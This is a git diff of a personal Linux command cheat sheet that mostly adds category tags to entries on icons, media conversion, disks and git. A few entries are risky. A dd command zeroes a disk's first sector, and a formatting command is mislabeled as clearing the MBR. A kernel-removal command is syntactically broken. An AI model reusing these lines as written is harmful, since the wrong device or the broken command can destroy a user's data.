-## Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
+## gui. Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
 $> function iconcolorsMint-X () {
 $> 	cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-$1-$2 ;
 $>     cd ~/.icons/Mint-X-$1-$2 ;
@@ -5219,7 +4649,7 @@ $>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/5e8048/888889/g" -e "s/4a6438/
 $>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
 $> }
 ##------------------------------------------
-## Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link-gnome /path/to/your.png
+## gui. Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link-gnome /path/to/your.png
 $> function symbolic-link-gnome {
 $> sudo cp $1 /usr/share/icons/gnome/16x16/emblem/emblem-symbolic-link.png ;
 $> sudo cp $1 /usr/share/icons/gnome/22x22/emblem/emblem-symbolic-link.png ;
@@ -5230,7 +4660,7 @@ $> sudo cp $1 /usr/share/icons/gnome/256x256/emblem/emblem-symbolic-link.png ;
 $> sudo gtk-update-icon-cache /usr/share/icons/gnome ;
 $> }
 ##------------------------------------------
-## Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link /path/to/your.png
+## gui. Change the shortcut/symlink/symbolic-link arrows from on top of desktop icons. USAGE: symbolic-link /path/to/your.png
 $> function symbolic-link {
 $> sudo cp $1 /usr/share/icons/Mint-X/emblems/16/emblem-symbolic-link.png ;
 $> sudo cp $1 /usr/share/icons/Mint-X/emblems/22/emblem-symbolic-link.png ;
@@ -5263,7 +4693,7 @@ $> function iconcolors () { cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$
 ##------------------------------------------
 $> function iconcolors () { cp -r /usr/share/icons/Mint-X      ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#aacb7d" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/5e8048/888889/g" -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ; }
 ##==========================================
-## Resize icons on desktop
+## gui. Resize icons on desktop
 ## Restore "Resize Icon..." contex menu on desktop Linux Mint. In a terminal, this will restore the legacy desktop behavior, including the ability to resize icons. "Resize Icon..." contex menu. gui changes
 $> gsettings set org.nemo.desktop use-desktop-grid false
 ## Or GUI
@@ -5273,7 +4703,7 @@ $> org > nemo > desktop
 ## untick the option
 $> "use-desktop-grid"
 ##==========================================
-## Disable updates for installed Chrome plugins
+## gui. Disable updates for installed Chrome plugins
 ## This will allow you to ensure you do not get nagged by updates and also protects you from watering hole attacks! Please be sure to make sure your plugins do not have any security issues! Backups are manifext.jason.bak credit @Jay https://chat.counterpoint.info
 $> find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_url\": \"hxxp/g' -i.bak '{}' \;
 ##==========================================
@@ -5316,6 +4746,7 @@ $> find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_ur
 ## ##    UNSORTED
 ## ###################################################
 ##==========================================
+## Script to sync and merge two directories.
 #!/bin/sh
 # Merge all files in two directories of your choice
 $> zenity --question --title="Direcrory sync program" --text="Press Yes to pick directories to sync."
@@ -5360,62 +4791,62 @@ $> find / -iname "manifest.json" -exec sed 's/\"update_url\": \"http/\"update_ur
 ## Find and Convert all libre office files to PDF without libreoffice GUI Show Sample Output
 $> find /home/foo/Documents/ -type f -iname "*.odt" -exec libreoffice --headless --convert-to pdf '{}' \;
 ##==========================================
-## Adminer. SQL GUI. The whole application is in one PHP file, which means that the deployment is as easy as it can get. It's more powerful than phpMyAdmin; it can edit views, procedures, triggers, etc.
+## gui. app. Adminer. SQL GUI. The whole application is in one PHP file, which means that the deployment is as easy as it can get. It's more powerful than phpMyAdmin; it can edit views, procedures, triggers, etc.
 $> sudo apt-get install adminer
 ##==========================================
-## Restore "Resize Icon..." contex menu on desktop Linux Mint. In a terminal, this will restore the legacy desktop behavior, including the ability to resize icons. "Resize Icon..." contex menu. gui changes
+## gui. Restore "Resize Icon..." contex menu on desktop Linux Mint. In a terminal, this will restore the legacy desktop behavior, including the ability to resize icons. "Resize Icon..." contex menu. gui changes
 $> gsettings set org.nemo.desktop use-desktop-grid false
 ##==========================================
-## Replace all instances of "A" with "B" in file "source" saved as file "destination"
+## shell. sed. Replace all instances of "A" with "B" in file "source" saved as file "destination"
 $> xxd -p source | fold -w2 | paste -sd' ' | sed "s/A/B/g" | xxd -p -r > destination
 ##==========================================
-## Play White noise from urandom
+## multimedia. audio. Play White noise from urandom
 $> aplay -c 2 -f S16_LE -r 44100 /dev/urandom
 ##==========================================
-## List files newest first
+## files. List files newest first
 $> ls -lt --time=atime
 ##==========================================
-## Find and replace specific characters in a single line in multiple files with sed
+## files. shell. Find and replace specific characters in a single line in multiple files with sed
 $> for f in `ls`; do sed -i '/MATCHING STRING/ { s/ORIGINAL/REPLACEMENT/; }' ${f} ; done
 ##==========================================
-## mp4 to mpeg for dvd creation
+## multimedia. video. mp4 to mpeg for dvd creation
 $> avconv -i FILE.mp4 -f dvd -c:v:0 mpeg2video -s 720x576 -r 25 -g 15 -b:v:0 8000000 -maxrate:v:0 8000000 -minrate:v:0 8000000 -bufsize:v:0 1835008 -packetsize 2048 -muxrate 10080000 -b:a 192000 -ar 48000 -c:a:0 ac3 -map 0:v -map 0:a FILE.mpeg
 ##==========================================
-## Show drive names next to their full serial number (and disk info)
+## os. hardware. Show drive names next to their full serial number (and disk info)
 $> find /dev/disk/by-id -type l -printf "%l\t%f\n" | cut -b7- | sort
 ##==========================================
-## Add a file to a .tar ball.
+## files. Add a file to a .tar ball.
 $> tar -rvf archive.tar file.txt
 ##==========================================
-## Change partition label
+## os. hardware. disk. Change partition label
 ## EXT linux filesystem
 ## Get present label
 $> sudo e2label /dev/sdb1
 ## linux file system type ext/ext3/ext4 partition
 $> sudo e2label /dev/sdb1 NEWLABEL
 ##------------------------------------------
-## NTFS Microsoft Windows filesystem
+## os. hardware. storage. NTFS Microsoft Windows filesystem
 ## NTFS partitions, use ntfslabel from the ntfs-3g package. 128 characters maximum characters in label
 ## Check the current label
 $> sudo ntfslabel /dev/sdb1
 ## Change to new label
 $> sudo ntfslabel /dev/sdb1 NEWLABEL
 ##------------------------------------------
-## FAT FAT32 DOS filesystem
+## os. hardware. disk. FAT FAT32 DOS filesystem
 ## FAT partitions the tool to use is "mlabel"
 ## Check the current label, mlabel is part of the mtools-package
 $> sudo mlabel -i /dev/sdb1 ::
 ## Change to new label
 $> sudo mlabel -i /dev/sdb1 ::NEWLABEL
 ##==========================================
-## Search the internet
+## web. Search the internet
 ## Written by Julian Assange
 $> man surfraw # -elvi list of search engines, -dump,
 $> sudo mcedit /etc/xdg/surfraw/conf
 ## man
 $> surfraw google -results=100 -dump PATTERN
 ##==========================================
-## Setup a transmission bittorent server
+## web. Setup a transmission bittorent server
 $> sudo apt-get install  transmission-gtk transmission-remote-cli transmission-daemon transmission-common transmission
 ## Add user debian-transmission to your group to access directories
 $> sudo usermod -a -G debian-transmission USERNAME
@@ -5426,10 +4857,10 @@ $> sudo service transmission-daemon reload  # start/stop/reload
 ## Go to http://localhost:9091
 ## ~/.config/transmission-daemon
 ##==========================================
-## Make mc always display non-blue background
+## files. filebrowser. Make mc always display non-blue background
 $> echo "alias mc='mc -S gotan'" >> .bashrc
 ##==========================================
-## Upgrade youtube-dl
+## web video. Upgrade youtube-dl. DEPRECATED. Upgrade to yt-dlp
 $> $ youtube-dl --version
 #> 2014.02.17
 $> sudo mv /usr/bin/youtube-dl /usr/bin/youtube-dl.old
@@ -5438,7 +4869,7 @@ $> sudo chmod 755 /usr/bin/youtube-dl
 $> youtube-dl --version
 #> 2015.12.13
 ##------------------------------------------
-## Upgrade youtube-dl
+## Upgrade youtube-dl DEPRECATED. Upgrade to yt-dlp
 $> $ youtube-dl --version
 #> 2014.02.17
 $> sudo mv /usr/bin/youtube-dl /usr/bin/youtube-dl.old
@@ -5447,7 +4878,7 @@ $> cd /usr/bin/ && sudo wget github.com/rg3/youtube-dl/releases/download/2017.07
 $> youtube-dl --version
 #> 2017.07.15
 ##==========================================
-## How to upgrade from Linux Mint 17 Qiana to Linux Mint 17.1 Rebecca
+## os. How to upgrade from Linux Mint 17 Qiana to Linux Mint 17.1 Rebecca
 $> sudo apt-get update
 $> sudo apt-get upgrade
 $> sudo apt-get dist-upgrade
@@ -5466,10 +4897,10 @@ $> sudo apt-get dist-upgrade
 #$> sudo apt-get update
 #$> sudo apt-get dist-upgrade
 ##==========================================
-## Move all located items to folder
+## files. Move all located items to folder
 $> locate -0 -i *barthes* | xargs -0 mv -t ~/'Books/Barthes, Roland'
 ##==========================================
-## Upgrade to new distribution
+## os. Upgrade to new distribution
 $> sudo cp /etc/apt/sources.list.d/official-package-repositories.list /etc/apt/sources.list.d/official-package-repositories.list.qiana.bak
 $> sudo cp /etc/apt/sources.list.d/official-package-repositories.list /etc/apt/sources.list.d/official-package-repositories.list.rebecca.bak
 $> sudo sed -i 's/qiana/rebecca/g' /etc/apt/sources.list.d/official-package-repositories.list
@@ -5479,10 +4910,10 @@ $> sudo apt-get update
 $> sudo apt-get dist-upgrade
 $> sudo sed -i 's/rebecca/rosa/g' /etc/apt/sources.list.d/official-package-repositories.list
 ##==========================================
-## Copy files to and from server over ssh with scp - secure copy
+## network. ssh. Copy files to and from server over ssh with scp - secure copy
 $> scp USER@192.168.1.11:/tmp/shot.png ~/
 ##==========================================
-## Convert SWF to video
+## mulimedia. video. Convert SWF to video
 ## This will dump a raw BGRA pixel stream and WAV which must then be converted to video:
 $> ffmpeg -f rawvideo -c:v rawvideo -s 1280x720 -r 12 -pix_fmt bgra -i "${i%.*}".bgra -c:v libx264 -preset veryslow -qp 0 -movflags +faststart -i "${i%.*}".wav -c:a libfdk_aac -b:a 384k "${i%.*}".mp4 ; rm "${i%.*}".bgra "${i%.*}".wav
 ## Our example generates an x264/720p/12fps/AAC best-quality MP4.
@@ -5492,7 +4923,7 @@ $> i=in.swf; dump-gnash -1 -j 1280 -k 720 -D "${i%.*}".bgra@12 -A "${i%.*}".wav 
 ## Count the number of pages of all PDFs in current directory and all subdirs, recursively
 $> find . -name "*.pdf" -exec pdftk {} dump_data output \; | grep NumberOfPages | awk '{print $1,$2}'
 ##==========================================
-## List all files modified by a command
+## files. List all files modified by a command
 $> D="$(date "+%F %T.%N")"; [COMMAND]; find . -newermt "$D"
 ## Often you run a command, but afterwards youre not quite sure what it did.
 ## By adding this prefix/suffix around [COMMAND], you can list any files that were modified.
@@ -5504,18 +4935,18 @@ $> find . -newermt "$D"
 ## If you want to look elsewhere change the find parameter, e.g.
 $> find /var/log . -newermt "$D"
 ##==========================================
-## Monitor all DNS queries made by Firefox
+## web. networking. Monitor all DNS queries made by Firefox
 $> NSPR_LOG_MODULES=nsHostResolver:5 NSPR_LOG_FILE=/tmp/log.txt firefox
 ##==========================================
-## Rolling upgrades via aptitude
+## os. update. Rolling upgrades via aptitude
 $> sudo sh -c "aptitude update; aptitude -DrVWZ full-upgrade; aptitude autoclean; exit"
 ##==========================================
-## Monitor Ebay for cheap things with shipping
+## web. Monitor Ebay for cheap things with shipping
 ## The ebay URL is the search query copied from the browser (here searching for bed stuff). The regex is for crap that should not be shown. Important is "Pickup only", which filters away all the things that cannot be shipped (a filter that cannot be done on Ebays webpage).
 ## It will output the title and url for all matching items, for all pages of the search result.
 $> xidel --quiet 'http://www.ebay.com/sch/Beds-Bed-Frames-/175758/i.html?_from=R40&_sac=1&_sop=15&_nkw=bed' -e 'css(".lvresult")[not(matches(., "Pickup only|BUILDING PLANS \(ONLY\)|PARTS LIST"))]/css(".lvtitle")/(.||": "||a/@href)'  -f 'css("a.gspr.next")'
 ##==========================================
-## Keep a log of the active windows
+## os. gui. Keep a log of the active windows
 ## This logs the titles of the active windows, thus you can monitor what you have done during which times. (it is not hard to also log the executable name, but then it is gets too long)
 $> while true; do (echo -n $(date  +"%F %T"):\ ; xwininfo -id $(xprop -root|grep "ACTIVE_WINDOW("|cut -d\  -f 5) | grep "Window id" | cut -d\" -f 2 ) >> logfile; sleep 60; done
 ##==========================================
@@ -5560,7 +4991,7 @@ $> | awk 'NR%1000==0{print NR>"/dev/stderr"}{print}'
 ## But you really want some idea of how far along your program is. Then you can run the above command to see how many % along xzcat is in reading the file.
 ## Note that this is for the GNU/Linux version of lsof; the one found on e.g. Darwin has slightly different output so the awk part may need some tweaks.
 ##==========================================
-## Monitors battery usage (rate of energy charge/discharge)
+## os. hardware. battery. Monitors battery usage (rate of energy charge/discharge)
 $> while cat energy_now; do sleep 1; done |awk -v F=$(cat energy_full) -v C=60 'NR==1{P=B=$1;p=100/F} {d=$1-P; if(d!=0&&d*D<=0){D=d;n=1;A[0]=B=P}; if(n>0){r=g=($1-B)/n;if(n>C){r=($1-A[n%C])/C}}; A[n++%C]=P=$1; printf "%3d %+09.5f %+09.5f\n", p*$1, p*g, p*r}'
 ## Needs to be run in a battery sysfs dir, eg. /sys/class/power_supply/BAT0
 ## Displays the battery's current charge and the rate per-second at which energy is {dis,}charging. All values are displayed as percentages of "full" charge.
@@ -5568,7 +4999,7 @@ $> while cat energy_now; do sleep 1; done |awk -v F=$(cat energy_full) -v C=60 '
 ## The sample output captures a scenario where I ran 'yes' in another terminal to max out a CPU. My battery was at 76% charge and you can see the energy drain starts to rise above 0.01% per-second as the cpu starts working and the fan kicks in etc. While idle it was more like 0.005% per-second.
 ## I tried to use this to estimate the remaining battery life/time until fully charged, but found it to be pretty useless... As my battery gets more charged it starts to charge slower, which meant the estimate was always wrong. Not sure if that's common for batteries or not.
 ##==========================================
-## Get simple weather info from wunderground.com with a zip code 94110 San Francisco
+## web. Get simple weather info from wunderground.com with a zip code 94110 San Francisco
 $> curl -s "http://www.wunderground.com/q/zmw:94110.1.99999" | grep "og:title" | cut -d\" -f4 | sed 's/&deg;/ degrees F/'
 ##==========================================
 ## list files recursively by size
@@ -5605,7 +5036,7 @@ $> exec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-
 ## It can be used to test FTP, HTTP, NTP, or can connect to netcat listening on a port (makes for a simple chat client!)
 ## Replace /tcp/ with /udp/ to use UDP instead.
 ##==========================================
-## Sort Apache access.log by date and time
+## web. logs. Sort Apache access.log by date and time
 $> sort -s -b -t' ' -k 4.9,4.12n -k 4.5,4.7M -k 4.2,4.3n -k 4.14,4.15n -k 4.17,4.18n -k 4.20,4.21n access.log*
 ## Sort Apache access logs by date and time using sort key field feature
 ##==========================================
@@ -5613,7 +5044,7 @@ $> sort -s -b -t' ' -k 4.9,4.12n -k 4.5,4.7M -k 4.2,4.3n -k 4.14,4.15n -k 4.17,4
 ## Prepend text to a file
 #$> echo "text to prepend" | cat - file
 ##==========================================
-## SSH connection through host in the middle; with key redirection
+## SSH connection through host in the middle; with key redirection.
 $> ssh -o "ProxyCommand ssh user@reachable_host -W %h:%p" user@unreacheable_host
 ## This command uses the reachable_host as a proxy; redirecting your request to the unreachable_host.
 ## The main advantage is that you need only one ssh key. You copy the public part to both servers and you can access the unreachable_host without a ## problem.
@@ -5623,18 +5054,18 @@ $> ssh -o "ProxyCommand ssh user@reachable_host -W %h:%p" user@unreacheable_host
 ## ProxyCommand ssh user@reachable_host -W %h:%p
 ## and, then, just ssh user@unreachable_host.
 ##==========================================
-## Convert diff output to HTML ins/del
+## web. os. shell. diff. Convert diff output to HTML ins/del.
 $> diff a.txt b.txt | grep -E '^(<|>)' | sed 's:^< \(.*\):<del style="color\:red; text-decoration\: none">- \1</del><br>:' | sed 's:^> \(.*\):<ins ## style="color\:green; text-decoration\: none">+ \1</ins><br>:'
 ##==========================================
-## Fast command-line directory browsing
+## shell. Fast command-line directory browsing.
 $> cdls() { if [[ $1 != "" ]] ; then cd $1; ls; else ls; fi };
 ## Not really alternative, just giving a different behavior listing current directory if no directory given.
 ##==========================================
-## A sorted summary of disk usage including hidden files and folders
+## hardware. disk. A sorted summary of disk usage including hidden files and folders.
 $> du -hs .[^.]* * | sort -h
 ## Same result as with 'du -ks .[^.]* * | sort -n' but with size outputs in human readable format (e.g., 1K 234M 2G)
 ##==========================================
-## Wait for file to stop changing
+## shell. Wait for file to stop changing
 $> echo FileName | perl -nlE'sleep 1 while time-(stat)[10]<10' && echo DONE
 ## perl version of "Wait for file to stop changing"
 ## When "FileName" has not been changed for last 10 seconds, then print "DONE"
@@ -9164,9 +8595,6 @@ $> git remote prune origin
 $> git branch
 $> git log
 ##==========================================
-## Control chromecast with cli  Awesome!
-https://www.linuxuprising.com/2018/05/command-line-chromecast-player-catt.html
-##==========================================
 ## General, you can always do:
 $> <command> | ssh user@remote-server "cat > output.txt"
 ## It saves output of <command> to output.txt file in remote server.
@@ -9214,6 +8642,9 @@ $> cp -a
 ## #######################################################
 ## ##    Chromecast
 ## #######################################################
+## Control chromecast with cli  Awesome!
+## https://www.linuxuprising.com/2018/05/command-line-chromecast-player-catt.html
+##-------------------------------
 ## Chromecast from cli
 $> sudo apt install python3-pip python3-setuptools
 $> pip3 install --user catt
@@ -9534,7 +8965,7 @@ git tag -d $(git for-each-ref --format='%(refname:short)' 'refs/tags/phabricator
 ## Or nuke all tags then re-pull.
 git tag -l | xargs git tag -d; git pull --tags
 ##==========================================
-## Change functions of mouse buttons
+## gui mouse. Change functions of mouse buttons
 $> firefox http://xahlee.info/linux/linux_swap_mouse_buttons.html
 ## get mouse name
 $> xinput --list
@@ -9545,9 +8976,6 @@ $> xinput --set-button-map "M585 Mouse" 1 2 3 4 5 6 7 8 9
 ## disable side buttons
 $> xinput --set-button-map "M585 Mouse" 1 2 3 4 5 6 7 0 0
 ##==========================================
-## This Does not work as tty is not correct in this case.
-$> ssh ops@mgmt0000.s0004.sfo.stcg.nonstandard.ai 'sudo tcam-gigetool "list --format %m%s%i%g%M%r" | tee /dev/tty | grep DFK | wc -l'
-##=========================================
 ## In order to get absolute directory name with ls, enter in the terminal command shell:
 $> ls -d $PWD/*
 ##==========================================
@@ -9558,7 +8986,7 @@ $> bind -x '"\C-l": cls';
 ## As the clear command does clear everything in my case, I have this on my .bashrc to have Control-L do exactly the same:
 $> bind -x '"\C-l"':clear
 ##==========================================
-## ways to shutdown a server
+## power. Ways to shutdown a server
 $> systemctl kexec/reboot
 $> sudo shutdown -r now
 $> sudo poweroff
@@ -9568,19 +8996,18 @@ $> hold down Alt + Print Screen, then the R E I S U B keys in that order
 $> sudo init 0
 $> sudo journalctl -u systemd-shutdownd
 ##==========================================
-$> firefox https://github.com/kellyjonbrazil/jtbl
-##==========================================
-## check the dependencies of packages in the repository:
+## install. Check the dependencies of packages in the repository:
 $> apt-cache depends package-name
 ## Shows package origin and versions available
 $> apt-cache policy <searchterm>
 ## display the complete details of the package version along with all dependencies.
 $> apt-cache showpkg chromium-browser
 ## displays the package version from Ubuntu repositories.
-$ apt-cache madison chromium-browser
+$> apt-cache madison chromium-browser
 ## Downgrade chromium
 $> sudo apt-get install chromium-codecs-ffmpeg=65.0.3325.181-0ubuntu1  chromium-codecs-ffmpeg=65.0.3325.181-0ubuntu1  chromium-browser=65.0.3325.181-0ubuntu1 -V
 ##==========================================
+## Prompt
 ## https://wiki.archlinux.org/index.php/Bash/Prompt_customization
 $>  txtblk='\e[0;30m' ## Black - Regular
 $>  txtred='\e[0;31m' ## Red
@@ -9687,6 +9114,7 @@ $>  n.e. (*) ||   yes    |   yes    ||    no    |   yes    ||  append
 $>           ||          |          ||          |          ||
 $> |& tee    ||   yes    |   yes    ||   yes    |   yes    || overwrite
 $> |& tee -a ||   yes    |   yes    ||   yes    |   yes    ||  append
+##==========================================
 ## Continuous gpu usage info, refresh interval of 1 second
 $> nvidia-smi -l 1
 ##==========================================
@@ -9810,18 +9238,15 @@ $>  >&-        ## closes stdout
 ## First add the software needed to make the connection work:
 ## install the required packages (on fedora)
 $> sudo apt-get install ifuse libimobiledevice-utils
-Once this is installed unlock the iPad and run idevicepair pair to pair the iPad with your Linux host. You should see a message saying that pairing was successful. Now we have access to the device let’s access its file system. Create the mount point and make the current user the owner:
+## Once this is installed unlock the iPad and run idevicepair pair to pair the iPad with your Linux host. You should see a message saying that pairing was successful. Now we have access to the device let’s access its file system. Create the mount point and make the current user the owner:
 $> sudo install -d /mnt/ipad -o $USER
-Finally, mount the iPad so we can access its file system:
+## Finally, mount the iPad so we can access its file system:
 $> ifuse /mnt/ipad
 $> ls -alh /mnt/ipad/
 ## If this fails ensure the ifuse module is loaded by running lsmod, and run modprobe ifuse if it isn’t. Once you’ve finished exploring don’t forget to release the iPad.
 $> umount /mnt/ipad
 ##==========================================
-$> firefox https://sanctum.geek.nz/arabesque/vim-koans/
-$> firefox https://stevelosh.com/blog/2013/04/git-koans/
-##==========================================
-## transcoding
+## video. Transcoding
 $> ffmpeg -i input.mkv -c:a libvorbis -c:v libvpx -b:a 80k -b:v 500k output.webm
 ## average bitrate is _exactly_ 2x more than specified same but with halving framerate
 $> ffmpeg -i input.mkv -c:a libvorbis -c:v libvpx -b:a 80k -b:v 500k -r 30 output.webm
@@ -9840,15 +9265,10 @@ $> ffmpeg -i my_video.mkv -vcodec x264 -minrate 1400000 -b:v 1500000 -maxrate 16
 $> ffmpeg -i input.mkv -filter:v "fps=fps=30" -c:v libvpx -b:v 500k -c:a libvorbis -b:a 80k output.webm
 ## it brings the output rate down to about 650k or so according to mpv. I think the -r option just sets the framerate on the container file but doesnt actually drop frames to get it. I may be wrong on that though.
 ##==========================================
-##
-$> firefox https://samrowe.com/wordpress/advancing-in-the-bash-shell/
-##==========================================
-## Remap Keyboard And Mouse Buttons On Linux With The New Key Mapper GUI
-$> firefox https://github.com/sezanzeb/key-mapper/releases
-##==========================================
 ## download music from youtube
 $> youtube-dl --extract-audio --audio-format mp3 --batch-file list.txt
 ##==========================================
+## learn.
 ##    1) learn what is Dockerfile
 ##    2) add some apps on top of base image with dockerfile
 ##    3) learn to mount volumes when docker run
@@ -9923,14 +9343,11 @@ $#    fi
 ## Make timestamped output file
 $> outputfile="output_$(date --utc +"%y_%m_%d_%H%M%S").mp4"
 ##==========================================
-## Build kernel
-$> firefox https://github.com/sn99/Optimizing-linux
-##==========================================
-## ripgrep is a line-oriented search tool that recursively searches your current directory for a regex pattern.
+## text. ripgrep - line-oriented search tool that recursively searches your current directory for a regex pattern.
 $> curl -LO https://github.com/BurntSushi/ripgrep/releases/download/12.1.1/ripgrep_12.1.1_amd64.deb
 $> sudo dpkg -i ripgrep_12.1.1_amd64.deb
 ##==========================================
-## script that records an endless GIF from webcam and then broadcasts it to a loopback camera.
+## video. Script that records an endless GIF from webcam and then broadcasts it to a loopback camera.
 $> sudo apt-get install v4l2loopback-utils
 ## creates fake camera input
 $> sudo modprobe v4l2loopback
@@ -9989,11 +9406,10 @@ EOF
 $> chmod +x ./fake_cam.sh
 $> ./fake_cam.sh 5
 ##==========================================
-## Search with arameters
+## web. Search with parameters
 $> intitle:"index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) -inurl:(hypem|unknownsecret|sirens|writeups|trimediacentral|articlescentral|listen77|mp3raid|mp3toss|mp3drug|theindexof|index_of|wallywashis|indexofmp3)
 ##==========================================
-##------------------------------------------
-## Use OBS to stream to video
+## video. Use OBS to stream to video
 $> firefox https://obsproject.com/wiki/install-instructions#linux
 $> firefox https://www.youtube.com/watch?v=Eca509IDLdM
 $> sudo add-apt-repository ppa:obsproject/obs-studio
@@ -10012,20 +9428,20 @@ $> ls /dev/ | grep video
 ## in obs go to tools pick
 $> v4l2sink
 ##==========================================
-## Data recovery
+## files. Data recovery
 $> firefox https://behind.pretix.eu/2020/11/28/undelete-flv-file/
 ##==========================================
-## Download vids from private channel
+## multimedia. web. Download vids from private channel
 ## Go to youtube page to be dl
 ## create cookiesfile.txt
 $> firefox https://chrome.google.com/webstore/detail/get-cookiestxt/bgaddhkoddajcdgocldbbfleckgcbcid/related?hl=en
 ## Download
-$> youtube-dl --cookies youtube.com_cookies.txt https://youtu.be/abcdefgh
+$> yt-dlp --cookies youtube.com_cookies.txt https://youtu.be/abcdefgh
 ##==========================================
-## Collect audio from youtube
+## multimedia. Collect audio from youtube
 $> youtube-dl -x --audio-format mp3 --prefer-ffmpeg --batch-file <list to download>
 ##==========================================
-## Tips and tricks from web
+## learn. Tips and tricks from web
 <<Comment5
 I have marked with a * those which I think are absolutely essential
 Items for each section are sorted by oldest to newest. Come back soon for more!
@@ -10161,25 +9577,25 @@ Retrieved from http://cfenollosa.com/misc/tricks.txt
 Last modified: Mon 13 Feb 2017 09:31:38 CET
 Comment5
 ##==========================================
-## BASH tricks
+## learn. BASH tricks
 $> w3m -dump http://cfenollosa.com/misc/tricks.txt
 ##==========================================
-## Cool diff
+## text. Cool diff
 $> diff --side-by-side test.txt test2.txt | pager
 ##==========================================
 ## Clear master boot record MBR
 $> mkfs.ext4 -F -O ^64bit -L 'WDUSB4TB' '/dev/sdc1'
 ##==========================================
-## Remove unused kernels
+## install. Remove unused kernels
 $> apt-get --purge remove $(dpkg --list | egrep -i 'linux-image|linux-headers' | awk '/ii/{ print $2}' | egrep -v "$i"
 ##==========================================
-## Write to file without echo to avoid "" and '' problems
+## text. Write to file without echo to avoid "" and '' problems
 $> cat > shell.txt << EOF
 $> Your test with imbedded "" and ''
 $> EOF
 EOF
-##-----------------------------------------
-## Youtube search and play
+##==========================================
+## web. multimedia. Youtube search and play
 $> cat > ytfzf.sh << EOF
 ## Youtube search and play
 #Usage: ytfzf.sh <search query>
@@ -10193,75 +9609,54 @@ $> cat > ytfzf.sh << EOF
 [ -z "$*" ] || curl "https://www.youtube.com/results" -s -G --data-urlencode "search_query=$*" |  pup 'script' | grep  "^ *var ytInitialData" | sed $> 's/^[^=]*=//g;s/;$//' | jq '..|.videoRenderer?' | sed '/^null$/d' | jq '.title.runs[0].text,.longBylineText.runs[$> 0].text,.shortViewCountText.simpleText,.lengthText.simpleText,.publishedTimeText.simpleText,.videoId'| sed 's/^"//;s/"$//;s/\\"//g' | sed -E -n $> "s/(.{60}).*/\1/;N;s/\n(.{30}).*/\n\1/;N;N;N;N;s/\n/\t|/g;p" | column -t  -s "$(printf "\t")" | fzf --delimiter='\|' --nth=1,2  | sed -E $> 's_.*\|([^|]*)$_https://www.youtube.com/watch?v=\1_' | xargs -r -I'{}' mpv {}
 EOF
 ##==========================================
-## Clear the MBR
+## os. Clear the MBR
 $> sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1
 ##==========================================
-## Software to look at
-## amass, dirsearch, and nmap
-## Browser: Firefox ESR
-## Email Client: Claws Mail
-## Media Player: VLC Media Player
-## Image viewer: Nomacs
-## Note Taking app: Zim
-## Graphics: Gimp 2.10, GMIC, Pixelitor, REMBG, Triangle wallpaper generator
-## Document work : LibreOffice, OnlyOffice, GImageReader, PDF Jumbler, HotShots screen caption,
-## Misc: Pulse Effects,
-## CopyQ Clipboard Manager with Advanced Features
-## , Virtual box, GNOME Screenshot,
-##
-## ## Flameshot
-## https://github.com/flameshot-org/flameshot/releases,
-##
-## Recoll and Video Trimme
-##==========================================
-## Pulse Effects large array of audio effects and filters to apply to input and output audio streams
+## multimedia. Pulse Effects large array of audio effects and filters to apply to input and output audio streams
 $> firefox https://github.com/wwmm/pulseeffects
 $> sudo add-apt-repository ppa:mikhailnov/pulseeffects
 $> sudo apt update
 $> sudo apt install pulseeffects pulseaudio --install-recommends
 ##==========================================
-## CAD in wine
-$> firefox https://www.babacad.com/linux_install_howto.html
-##==========================================
-## VM Win10
+## os. VM Win10
 ## IEUser:Passwr0rd!
 $> firefox https://isoriver.com
 $> wget https://az792536.vo.msecnd.net/vms/VMBuild_20190311/VirtualBox/MSEdge/MSEdge.Win10.VirtualBox.zip
 ## Also see
 $> firefox https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
 ##==========================================
-## Find me a Linux Distro
+## os. Find me a Linux Distro
 ## Discover new Linux distribution with a single click
 $> firefox https://www.fmald.net/
 ##==========================================
-## rembg removes backgrounds from images
+## multimedia. rembg removes backgrounds from images
 $> firefox https://github.com/danielgatis/rembg
 ##==========================================
-## Change Git Remote URL
+## git. Change Git Remote URL
 ## In order to change the URL of a Git remote, you have to use the “git remote set-url” command and specify the name of the remote as well as the new remote URL to be changed.
 $> git remote set-url <remote_name> <remote_url>
 ## For example, let’s say that you want to change the URL of your Git origin remote.
 ## In order to achieve that, you would use the “set-url” command on the “origin” remote and you would specify the new URL.
 $> git remote set-url origin git@github.com:$USER/LinuxCommands.git
 ##==========================================
-## Get the path without the name of the program. Terraform as an example.
+## files. Get the path without the name of the program. Terraform as an example.
 $> tfPath=$(which terraform | rev | cut -d'/' -f2- | rev)
 $> echo $tfPath
 ##==========================================
-## Cut
+## multimedia. vieo. Cut
 $> ffmpeg -ss 0:23:10.5 -to 0:24:40 -i "[YURI] School Days  S01E01 (BD 1080p x264 10bit Flac).mkv" -vf "subtitles=\[YURI\]\ School\ Days\ \ S01E01\ \(BD\ 1080p\ x264\ 10bit\ Flac\).mkv" -c:v libx264 -c:a aac endings/1.mp4
 ##==========================================
-## Quick ref for for/do/done commands 
+## script. shell. Quick ref for for/do/done commands
 $> for i in {01..10}; do <COMMAND> <BLA>$i; done
 ##==========================================
-## linux on floppy
+## os. linux on floppy
 $> firefox https://bits.p1x.in/floppinux-an-embedded-linux-on-a-single-floppy/
